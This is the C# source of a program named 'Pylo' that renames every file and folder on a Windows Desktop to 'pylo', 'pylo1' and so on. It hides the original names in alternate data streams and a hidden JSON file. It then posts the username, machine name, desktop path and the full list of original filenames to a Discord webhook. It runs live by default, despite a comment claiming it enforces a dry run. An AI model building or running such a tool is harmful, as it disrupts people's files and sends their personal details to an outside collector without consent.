using System.Reflection;
using System.Text.Json;
using System.Text;

// args:
// --undo     : restore original names
// --dry-run  : do not perform any changes, just show what would be done

// compile with: dotnet publish -c Release -r win-x64

class Program
{
    // ====== CONFIG ======
    const string BuiltInWebhookUrl = "Webhook URL";
    const bool EXECUTE_BY_DEFAULT = true; // for development, enforces --dry-run, overridden with --execute

    // ====== STATE ======
    static readonly HttpClient http = new HttpClient();
    static bool Undo = false;
    static bool DryRun = !EXECUTE_BY_DEFAULT;
    static string WebhookUrl = BuiltInWebhookUrl;

    static string AppDataDir =>
    Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        Path.GetFileNameWithoutExtension(Environment.ProcessPath) ?? "Pylo"
    );

    static string DirMapPath => Path.Combine(AppDataDir, ".pylo_dirs.orig.json");
    static readonly JsonSerializerOptions JsonOpts = new() { WriteIndented = false };

    static async Task<int> Main(string[] args)
    {
        foreach (var a in args)
        {
            var x = a.Trim();
            if (x.Equals("--undo", StringComparison.OrdinalIgnoreCase) || x.Equals("/undo", StringComparison.OrdinalIgnoreCase)) Undo = true;
            if (x.Equals("--dry-run", StringComparison.OrdinalIgnoreCase) || x.Equals("/dry-run", StringComparison.OrdinalIgnoreCase)) DryRun = true;
            if (x.Equals("--execute", StringComparison.OrdinalIgnoreCase) || x.Equals("/execute", StringComparison.OrdinalIgnoreCase)) DryRun = false;
            if (x.StartsWith("--webhook=", StringComparison.OrdinalIgnoreCase)) WebhookUrl = x.Substring(10);
            if (x.StartsWith("/webhook=", StringComparison.OrdinalIgnoreCase)) WebhookUrl = x.Substring(9);
        }

        string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string user = Environment.UserName;
        string machine = Environment.MachineName;
        var started = DateTimeOffset.Now;

        int renamed = 0, skipped = 0, restored = 0, errors = 0;
        var changeLines = new List<string>();

        try
        {
            Directory.CreateDirectory(AppDataDir);

            if (!Undo)
            {
                var files = EnumerateFiles(desktop);
                var dirs = EnumerateDirs(desktop);

                var plan = new List<RenamePlan>();
                foreach (var p in files)
                {
                    try
                    {
                        if (IsLockedFile(p)) { skipped++; continue; }
                        plan.Add(new RenamePlan
                        {
                            Kind = ItemKind.File,
                            OriginalPath = p,
                            ExtFull = GetFullExtensionFromName(Path.GetFileName(p)),
                            TempPath = MakeTempName(p, ".pylo_tmp")
                        });
                    }
                    catch { errors++; }
                }
                foreach (var d in dirs)
                {
                    try
                    {
                        if (IsLockedDir(d)) { skipped++; continue; }
                        plan.Add(new RenamePlan
                        {
                            Kind = ItemKind.Dir,
                            OriginalPath = d,
                            ExtFull = "<DIR>",
                            TempPath = MakeTempName(d, ".pylo_tmpdir")
                        });
                    }
                    catch { errors++; }
                }

                var existing = SnapshotExisting(desktop);
                var nextIndex = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
                var assigned = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                foreach (var item in plan)
                {
                    string dir = Path.GetDirectoryName(item.OriginalPath)!;
                    if (!nextIndex.ContainsKey(item.ExtFull)) nextIndex[item.ExtFull] = 0;

                    while (true)
                    {
                        int idx = nextIndex[item.ExtFull];
                        string target = Path.Combine(dir, idx == 0
                            ? $"pylo{(item.Kind == ItemKind.File ? item.ExtFull : "")}"
                            : $"pylo{idx}{(item.Kind == ItemKind.File ? item.ExtFull : "")}");

                        if (!existing.Contains(target) && !assigned.Contains(target))
                        {
                            item.FinalPath = target;
                            assigned.Add(target);
                            nextIndex[item.ExtFull] = idx + 1;
                            break;
                        }
                        nextIndex[item.ExtFull] = idx + 1;
                    }
                }

                if (DryRun)
                {
                    foreach (var item in plan)
                    {
                        changeLines.Add($"{Path.GetFileName(item.OriginalPath)} -> {Path.GetFileName(item.FinalPath)}");
                        renamed++;
                    }
                }
                else
                {
                    foreach (var item in plan)
                    {
                        try
                        {
                            if (item.Kind == ItemKind.File)
                            {
                                TryWriteADS(item.OriginalPath, Path.GetFileName(item.OriginalPath));
                                File.Move(item.OriginalPath, item.TempPath);
                            }
                            else
                            {
                                Directory.Move(item.OriginalPath, item.TempPath);
                            }
                        }
                        catch { errors++; skipped++; }
                    }

                    var dirMap = LoadDirMap();
                    foreach (var item in plan)
                    {
                        try
                        {
                            bool existsNow = item.Kind == ItemKind.File ? File.Exists(item.TempPath) : Directory.Exists(item.TempPath);
                            if (!existsNow) { skipped++; continue; }

                            if (item.Kind == ItemKind.Dir)
                            {
                                dirMap[item.FinalPath] = Path.GetFileName(item.OriginalPath);
                            }

                            if (item.Kind == ItemKind.File) File.Move(item.TempPath, item.FinalPath);
                            else Directory.Move(item.TempPath, item.FinalPath);

                            changeLines.Add($"{Path.GetFileName(item.OriginalPath)} -> {Path.GetFileName(item.FinalPath)}");
                            renamed++;
                        }
                        catch { errors++; skipped++; }
                    }
                    SaveDirMap(LoadDirMapMerged(changeLines, plan, dirMap));

                    foreach (var item in plan)
                    {
                        try
                        {
                            if (ExistsPath(item.TempPath))
                            {
                                var leftover = item.TempPath + ".leftover";
                                if (!ExistsPath(leftover))
                                {
                                    if (item.Kind == ItemKind.File) File.Move(item.TempPath, leftover);
                                    else Directory.Move(item.TempPath, leftover);
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            else
            {
                var files = EnumerateFiles(desktop);
                var dirs = EnumerateDirs(desktop);
                var dirMap = LoadDirMap();

                if (DryRun)
                {
                    foreach (var p in files)
                    {
                        try
                        {
                            string? orig = TryReadADS(p);
                            if (string.IsNullOrEmpty(orig)) { skipped++; continue; }
                            string parent = Path.GetDirectoryName(p)!;
                            string safe = SanitizeFileName(orig);
                            string target = Path.Combine(parent, safe);
                            if (ExistsPath(target))
                                target = UniqueCollisionName(parent, Path.GetFileNameWithoutExtension(safe), Path.GetExtension(safe), isDir: false);
                            changeLines.Add($"{Path.GetFileName(p)} -> {Path.GetFileName(target)}");
                            restored++;
                        }
                        catch { errors++; }
                    }
                    foreach (var d in dirs)
                    {
                        try
                        {
                            if (!dirMap.TryGetValue(d, out var orig)) { skipped++; continue; }
                            string parent = Path.GetDirectoryName(d)!;
                            string safe = SanitizeFileName(orig);
                            string target = Path.Combine(parent, safe);
                            if (ExistsPath(target))
                                target = UniqueCollisionName(parent, safe, "", isDir: true);
                            changeLines.Add($"{Path.GetFileName(d)} -> {Path.GetFileName(target)}");
                            restored++;
                        }
                        catch { errors++; }
                    }
                }
                else
                {
                    foreach (var p in files)
                    {
                        try
                        {
                            string? orig = TryReadADS(p);
                            if (string.IsNullOrEmpty(orig)) { skipped++; continue; }
                            string parent = Path.GetDirectoryName(p)!;
                            string safe = SanitizeFileName(orig);
                            string target = Path.Combine(parent, safe);
                            if (ExistsPath(target))
                                target = UniqueCollisionName(parent, Path.GetFileNameWithoutExtension(safe), Path.GetExtension(safe), isDir: false);
                            File.Move(p, target);
                            changeLines.Add($"{Path.GetFileName(p)} -> {Path.GetFileName(target)}");
                            restored++;
                        }
                        catch { errors++; }
                    }

                    bool mapChanged = false;
                    foreach (var d in dirs)
                    {
                        try
                        {
                            if (!dirMap.TryGetValue(d, out var orig)) { skipped++; continue; }
                            string parent = Path.GetDirectoryName(d)!;
                            string safe = SanitizeFileName(orig);
                            string target = Path.Combine(parent, safe);
                            if (ExistsPath(target))
                                target = UniqueCollisionName(parent, safe, "", isDir: true);
                            Directory.Move(d, target);
                            changeLines.Add($"{Path.GetFileName(d)} -> {Path.GetFileName(target)}");
                            dirMap.Remove(d);
                            mapChanged = true;
                            restored++;
                        }
                        catch { errors++; }
                    }
                    if (mapChanged) SaveDirMap(dirMap);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Fatal: " + ex.Message);
            errors++;
        }

        var finished = DateTimeOffset.Now;

        await SendDiscordReport(new WebhookReport
        {
            Title = Undo ? "Pylo Restore" : "Pylo Rename",
            DryRun = DryRun,
            User = user,
            Machine = machine,
            Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Started = started,
            Finished = finished,
            Renamed = renamed,
            Restored = restored,
            Skipped = skipped,
            Errors = errors,
            Changes = changeLines
        });

        Console.WriteLine(Undo
            ? $"{(DryRun ? "[Dry Run] " : "")}Done. Restored={restored}, Skipped={skipped}, Errors={errors}"
            : $"{(DryRun ? "[Dry Run] " : "")}Done. Renamed={renamed}, Skipped={skipped}, Errors={errors}");

        return 0;
    }

    enum ItemKind { File, Dir }
    class RenamePlan
    {
        public ItemKind Kind;
        public string OriginalPath = "";
        public string TempPath = "";
        public string FinalPath = "";
        public string ExtFull = "";
    }

    class WebhookReport
    {
        public string Title = "";
        public bool DryRun;
        public string User = "";
        public string Machine = "";
        public string Desktop = "";
        public DateTimeOffset Started;
        public DateTimeOffset Finished;
        public int Renamed;
        public int Restored;
        public int Skipped;
        public int Errors;
        public List<string> Changes = new();
    }

    static IEnumerable<string> EnumerateFiles(string desktop)
    {
        foreach (var f in Directory.EnumerateFiles(desktop, "*", new EnumerationOptions { RecurseSubdirectories = false, IgnoreInaccessible = true, AttributesToSkip = FileAttributes.System | FileAttributes.ReparsePoint }))
            yield return f;
    }
    static IEnumerable<string> EnumerateDirs(string desktop)
    {
        foreach (var d in Directory.EnumerateDirectories(desktop, "*", new EnumerationOptions { RecurseSubdirectories = false, IgnoreInaccessible = true, AttributesToSkip = FileAttributes.System | FileAttributes.ReparsePoint }))
            yield return d;
    }
    static HashSet<string> SnapshotExisting(string desktop)
    {
        var set = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var p in Directory.EnumerateFileSystemEntries(desktop, "*", new EnumerationOptions { RecurseSubdirectories = false, IgnoreInaccessible = true, AttributesToSkip = FileAttributes.System | FileAttributes.ReparsePoint }))
        {
            if (p.EndsWith(".pylo_tmp", StringComparison.OrdinalIgnoreCase)) continue;
            if (p.EndsWith(".pylo_tmpdir", StringComparison.OrdinalIgnoreCase)) continue;
            set.Add(p);
        }
        return set;
    }

    static bool ExistsPath(string p) => File.Exists(p) || Directory.Exists(p);
    static bool IsLockedFile(string path) { try { using var _ = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.None); return false; } catch { return true; } }
    static bool IsLockedDir(string path) { try { _ = Directory.GetFiles(path); return false; } catch { return true; } }

    static void TryWriteADS(string path, string originalName)
    {
        try { using var s = new FileStream(path + ":pylo.orig", FileMode.Create, FileAccess.Write, FileShare.Read); using var w = new StreamWriter(s); w.Write(originalName); }
        catch { }
    }
    static string? TryReadADS(string path)
    {
        try { using var s = new FileStream(path + ":pylo.orig", FileMode.Open, FileAccess.Read, FileShare.ReadWrite); using var r = new StreamReader(s); return r.ReadToEnd().Trim(); }
        catch { return null; }
    }

    static string GetFullExtensionFromName(string name)
    {
        int i = name.IndexOf('.');
        return i >= 0 ? name.Substring(i) : "";
    }
    static string MakeTempName(string originalPath, string suffix)
    {
        string dir = Path.GetDirectoryName(originalPath)!;
        string name = Path.GetFileName(originalPath);
        string candidate;
        do { candidate = Path.Combine(dir, name + "." + Guid.NewGuid().ToString("N") + suffix); }
        while (ExistsPath(candidate));
        return candidate;
    }

    static string UniqueCollisionName(string dir, string baseName, string ext, bool isDir)
    {
        string candidate = Path.Combine(dir, isDir ? baseName : baseName + ext);
        if (!ExistsPath(candidate)) return candidate;
        int i = 1;
        while (true)
        {
            candidate = Path.Combine(dir, isDir ? $"{baseName} (restored {i})" : $"{baseName} (restored {i}){ext}");
            if (!ExistsPath(candidate)) return candidate;
            i++;
        }
    }
    static string SanitizeFileName(string name)
    {
        foreach (var c in Path.GetInvalidFileNameChars()) name = name.Replace(c, '_');
        return name;
    }

    static Dictionary<string, string> LoadDirMap()
    {
        try
        {
            if (!File.Exists(DirMapPath)) return new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            var json = File.ReadAllText(DirMapPath);
            return JsonSerializer.Deserialize<Dictionary<string, string>>(json) ?? new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        }
        catch { return new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase); }
    }
    static void SaveDirMap(Dictionary<string, string> map)
    {
        try
        {
            Directory.CreateDirectory(AppDataDir);
            var json = JsonSerializer.Serialize(map, JsonOpts);
            File.WriteAllText(DirMapPath, json);
            try
            {
                var attr = File.GetAttributes(DirMapPath);
                if ((attr & FileAttributes.Hidden) == 0)
                    File.SetAttributes(DirMapPath, attr | FileAttributes.Hidden);
            }
            catch { }
        }
        catch { }
    }
    static Dictionary<string, string> LoadDirMapMerged(List<string> lines, List<RenamePlan> plan, Dictionary<string, string> existing)
    {
        return existing;
    }

    static object Field(string name, string value, bool inline) =>
        new { name, value = string.IsNullOrEmpty(value) ? "\u200B" : value, inline };

    static async Task SendDiscordReport(WebhookReport report)
    {
        if (string.IsNullOrWhiteSpace(WebhookUrl) || WebhookUrl.Contains("PUT_YOUR_WEBHOOK_HERE"))
        {
            Console.WriteLine("Webhook not set (edit BuiltInWebhookUrl).");
            return;
        }

        string mode = report.DryRun ? "DRY RUN" : "EXECUTED";
        string action = report.Title + (report.DryRun ? " (Dry Run)" : "");
        var embed = new
        {
            title = action,
            description = report.DryRun
                ? "Planned changes (no filesystem modifications were made)."
                : "Completed changes.",
            color = report.DryRun ? 0xF1C40F : 0x5865F2,
            fields = new[]
            {
                Field("User", report.User, true),
                Field("Machine", report.Machine, true),
                Field("Desktop", report.Desktop, false),
                Field("Mode", mode, true),
                Field("Started", report.Started.ToString("u"), true),
                Field("Finished", report.Finished.ToString("u"), true),
                Field("Renamed", report.Renamed.ToString(), true),
                Field("Restored", report.Restored.ToString(), true),
                Field("Skipped", report.Skipped.ToString(), true),
                Field("Errors", report.Errors.ToString(), true),
            }
        };

        string preview = "";
        if (report.Changes.Count > 0)
        {
            var sb = new StringBuilder();
            int maxChars = 1800;
            foreach (var line in report.Changes)
            {
                if (sb.Length + line.Length + 1 > maxChars) break;
                sb.AppendLine(line);
            }
            preview = sb.ToString().TrimEnd();
        }

        bool attachFile = false;
        string fileName = "changes.txt";
        byte[]? fileBytes = null;

        if (report.Changes.Count > 0)
        {
            var full = string.Join(Environment.NewLine, report.Changes);
            if (full.Length > 1800 || report.Changes.Count > 50)
            {
                attachFile = true;
                fileBytes = Encoding.UTF8.GetBytes(full);
            }
        }

        try
        {
            if (attachFile && fileBytes != null)
            {
                using var form = new MultipartFormDataContent();
                var payload = new Dictionary<string, object?>
                {
                    ["username"] = "Pylo Bot",
                    ["embeds"] = preview.Length > 0
                        ? new[] { AddPreviewField(embed, preview) }
                        : new[] { embed }
                };
                var json = JsonSerializer.Serialize(payload);
                form.Add(new StringContent(json, Encoding.UTF8, "application/json"), "payload_json");
                var fileContent = new ByteArrayContent(fileBytes);
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
                form.Add(fileContent, "file1", fileName);

                using var resp = await http.PostAsync(WebhookUrl, form);
                resp.EnsureSuccessStatusCode();
            }
            else
            {
                var payload = new Dictionary<string, object?>
                {
                    ["username"] = "Pylo Bot",
                    ["embeds"] = preview.Length > 0
                        ? new[] { AddPreviewField(embed, preview) }
                        : new[] { embed }
                };
                var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
                using var resp = await http.PostAsync(WebhookUrl, content);
                resp.EnsureSuccessStatusCode();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Webhook error: " + ex.Message);
        }
    }

    static object AddPreviewField(object embedAnon, string preview)
    {
        var lines = preview.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
        string header = $"Changes (preview, {lines.Length} lines)";
        return new
        {
            title = (string)embedAnon.GetType().GetProperty("title")!.GetValue(embedAnon)!,
            description = (string)embedAnon.GetType().GetProperty("description")!.GetValue(embedAnon)!,
            color = (int)embedAnon.GetType().GetProperty("color")!.GetValue(embedAnon)!,
            fields = AppendField(
                (Array)embedAnon.GetType().GetProperty("fields")!.GetValue(embedAnon)!,
                Field(header, "```" + preview + "```", false)
            )
        };
    }

    static object[] AppendField(Array fieldsArray, object newField)
    {
        var list = new List<object>();
        foreach (var f in fieldsArray) list.Add(f!);
        list.Add(newField);
        return list.ToArray();
    }
}
